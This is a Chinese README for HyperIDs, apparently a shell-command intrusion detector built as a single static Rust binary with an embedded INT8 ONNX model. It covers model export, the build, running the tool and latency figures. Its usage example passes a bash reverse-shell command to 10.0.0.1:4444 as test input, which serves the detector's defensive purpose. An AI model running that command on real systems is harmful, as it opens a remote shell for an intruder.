# HyperIDs Rust 单文件发布版

用 Rust `ort` 绑定 + ONNX Runtime INT8 静态库，把模型和推理引擎编进一个 `statically linked` 二进制。

## 产出

- `hyperids`：直接输入 shell 命令，输出 verdict + actions + MITRE。
- 模型 `model_int8.onnx` 和 `vocab.txt` 在编译期内嵌进二进制，运行时不需要 ONNX Runtime `.so`，也不需要模型文件。
- 本机参考：完全静态二进制 46MB，模型前向约 8ms/条（8 线程）。

## 准备

1. 生成 INT8 ONNX：

```bash
cd /home/ubuntu/Works/hyperids
PYTHONPATH=. python deploy/export_onnx.py \
  --model_dir model/checkpoints_gpu/final_model_v9 \
  --out /tmp/hyperids_v9_aligned_256_int8.onnx \
  --seq_len 256

PYTHONPATH=. python deploy/quantize_int8.py \
  --in /tmp/hyperids_v9_aligned_256_int8.onnx \
  --out /tmp/hyperids_v9_aligned_256_int8.onnx
```

2. 把模型和词表放到 demo 根目录：

```bash
cp /tmp/hyperids_v9_aligned_256_int8.onnx deploy/ort_rust_demo/model_int8.onnx
cp model/checkpoints_gpu/final_model_v9/vocab.txt deploy/ort_rust_demo/vocab.txt
```

3. 下载/解压 ONNX Runtime 静态库，例如 RapidAI OnnxruntimeBuilder 的
   `onnxruntime-v1.23.2-ubuntu-22.04-amd64-static.7z`，得到 `lib/libonnxruntime.a`。

## 编译

```bash
cd deploy/ort_rust_demo

ORT_LIB_LOCATION=/path/to/onnxruntime-static/lib \
RUSTFLAGS='-C target-feature=+crt-static' \
cargo build --release
```

## 运行

```bash
./target/release/hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
./target/release/hyperids --bench
```

> 注意：当前 tokenizer 是纯 Rust 的 ASCII/WordPiece 实现；
> 对非 ASCII shell 命令需要进一步按 HuggingFace `BertTokenizer` 语义补全。

## 性能指标

| 线程数 | 单条延迟 |
|---:|---:|
| 1 线程 | ~21.3 ms/条 |
| 2 线程 | ~13.9 ms/条 |
| 4 线程 | ~8.9 ms/条 |
| 8 线程 | ~5.6 ms/条 |

峰值 RSS：1 线程 ~78MB，多线程 ~82MB。
